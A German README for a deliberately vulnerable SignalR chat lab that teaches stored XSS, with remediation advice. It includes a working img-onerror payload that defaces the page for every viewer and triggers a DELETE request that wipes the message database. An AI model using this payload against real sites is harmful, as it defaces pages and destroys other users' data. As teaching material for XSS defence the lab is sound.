# 🛡️ SignalR XSS & Security Lab

Dieses Projekt ist eine absichtlich unsichere Chat-Anwendung. Sie dient als **Lernumgebung**, um Sicherheitslücken wie Cross-Site Scripting (XSS) und die Risiken von LocalStorage-basierten JWTs zu verstehen, zu demonstrieren und zu beheben.

## 🚀 Features
* **Echtzeit-Chat:** Kommunikation über **SignalR** und ASP.NET Core.
* **Dynamisches Design:** Automatische Generierung von Pastell-Farben basierend auf dem Benutzernamen.
* **Absichtliche Schwachstellen:** Demonstriert **Stored XSS** durch die Verwendung von `innerHTML` statt `textContent`.
* **Dynamische Endpunkte:** Das Frontend nutzt relative Pfade, sodass kein Hardcoding von Ports nötig ist.

## 🛠️ Installation & Start

1.  **Backend:**
    * Öffne den Ordner `SignalRChatServer` in Visual Studio oder VS Code.
    * Starte das Projekt mit `dotnet run`. Der Server läuft standardmäßig auf `http://localhost:5001`.

2.  **Frontend:**
    * Da die Dateien im `wwwroot`-Ordner des Servers liegen, öffne einfach `http://localhost:5001/index.html` in deinem Browser.
    * Gib einen Namen ein und beginne zu chatten.

---

## ☣️ Das "Hacker-Defacement" Experiment

Dieses Tutorial zeigt, wie ein Angreifer das komplette Aussehen der Webseite für alle Nutzer verändern kann ("Defacement"). Dies ist ein klassischer Weg, um Macht über eine Webpräsenz zu demonstrieren.

### Der Angriff:
Kopiere diesen Payload in das Chat-Eingabefeld. Sobald andere Nutzer diese Nachricht empfangen, verwandelt sich ihr Chat-Fenster in einen "Hacked"-Screen mit Matrix-Vibe.

```html
<img src=x onerror="
    /* 1. Den gesamten Screen in Hacker-Optik überschreiben */
    document.body.innerHTML = `
        <div id='hacker-screen' style='position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:#0f0;z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:monospace;text-shadow:0 0 5px #0f0;text-align:center;'>
            <h1 style='font-size:50px;margin-bottom:10px;'>⚠️ SYSTEM COMPROMISED ⚠️</h1>
            <h2 style='font-size:25px;'>HACKED BY [DEIN NAME]</h2>
            <p style='margin:20px;max-width:600px;'>Ich bin ein netter Hacker. Ich habe alle Nachrichten in der Datenbank durch diesen Screen ersetzt. Ich gebe dir einen Reset-Knopf, aber du musst beweisen, dass du ein echter Admin bist und ihn im Code aktivieren.</p>
            
            <div id='matrix-bg' style='font-size:10px;opacity:0.3;margin-bottom:30px;'></div>
            
            <button id='repair-btn' disabled style='background:transparent;border:2px solid #0f0;color:#0f0;padding:15px 30px;font-size:20px;cursor:not-allowed;opacity:0.5;'>
                [ REPAIR SYSTEM ]
            </button>
            <p style='font-size:12px;margin-top:10px;color:#888;'>(Tipp: inspect element -> remove 'disabled' attribute)</p>
        </div>`;

    /* 2. Matrix-Animation für den Vibe */
    setInterval(() => {
        const m = document.getElementById('matrix-bg');
        if(m) m.innerHTML = Math.random().toString(2).substring(2, 15) + ' ' + m.innerHTML.substring(0, 100);
    }, 150);

    /* 3. Logik für den Lösch-Vorgang (wenn der Button aktiviert wurde) */
    document.getElementById('repair-btn').onclick = function() {
        this.innerHTML = 'CLEANING DB...';
        
        // Sende die echte DELETE Anfrage an dein Backend
        fetch('/messages', { method: 'DELETE' })
            .then(() => {
                alert('Datenbank bereinigt! Starte System neu...');
                location.reload();
            })
            .catch(err => {
                alert('Fehler: ' + err);
                location.reload();
            });
    };
">
```

### 🔄 Notfall-Reset via Swagger

Sollte ein Angriff die Website komplett unbrauchbar gemacht haben, kannst du das System jederzeit zurücksetzen. Da die Nachrichten direkt aus der Datenbank geladen werden, löscht ein Reset der DB-Einträge auch den bösartigen Code:

1.  Navigiere zu http://localhost:5001/swagger.
    
2.  Suche den **DELETE** Endpoint unter /messages.
    
3.  Klicke auf **Try it out** und dann auf **Execute**.
    
4.  Lade den Chat neu – alle injizierten Skripte sind nun entfernt.
    

🔒 Wie man es richtig macht (The Fix)
-------------------------------------

In einer produktiven App sollten folgende Punkte umgesetzt werden:

*   **Kein innerHTML:** Verwende in script.js konsequent .textContent statt .innerHTML. Dies ist die wichtigste Verteidigung gegen XSS.
    
*   **HttpOnly Cookies:** Speichere JWTs niemals im localStorage. Nutze **HttpOnly Cookies**, damit JavaScript keinen Zugriff auf die Session-Token hat.
    
*   **CSP (Content Security Policy):** Implementiere einen **CSP-Header**, der Inline-Skripte wie onerror blockiert.
    
*   **Backend Sanitization:** Nutze Bibliotheken wie **Ganss.XSS** im Backend, um Nachrichten zu filtern, bevor sie gespeichert werden.
    

> \[!WARNING\]**Warnung:** Dieses Projekt dient ausschließlich zu Bildungszwecken. Das Ausführen von XSS-Angriffen auf fremde Systeme ohne Erlaubnis ist illegal.
